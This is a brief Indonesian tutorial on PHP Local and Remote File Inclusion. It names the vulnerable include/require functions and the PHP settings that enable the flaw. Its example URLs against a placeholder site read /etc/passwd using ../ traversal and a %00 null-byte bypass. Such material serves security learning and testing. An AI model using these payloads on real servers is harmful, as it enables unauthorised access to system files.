# Tujuan

- LFI mengakses semua file di dalam server dengan melalui URL
- RFI mengizinkan mengincludekan file dari luar server

# Faktor Terjadi LFI & RFI

- Mengandung script berikut :
  - include();
  - include_once();
  - require();
  - require_once();

# Syarat Terjadi LFI & RFI

- Konfigurasi PHP di server seperti berikut :
  - allow_url_include = on
  - allow_url_fopen = on
  - magic_quotes_gpc = off

# Contoh URL LFI & RFI

- http://www.situs-target.com/index.php?text=text.php
- Bagian =text.php merupakan file yang diinclude dan jika tidak difilter maka dapat diganti
- http://www.situs-target.com/index.php?text=/etc/passwd
- Jika muncul pesan error atau tidak terjadi apa-apa maka coba gunakan ../ sampai bisa
- http://www.situs-target.com/index.php?text=../../../../../etc/passwd
- Jika masih aja, coba gunakan %00 sebagai null injection di akhir
- http://www.situs-target.com/index.php?text=../../../../../etc/passwd%00
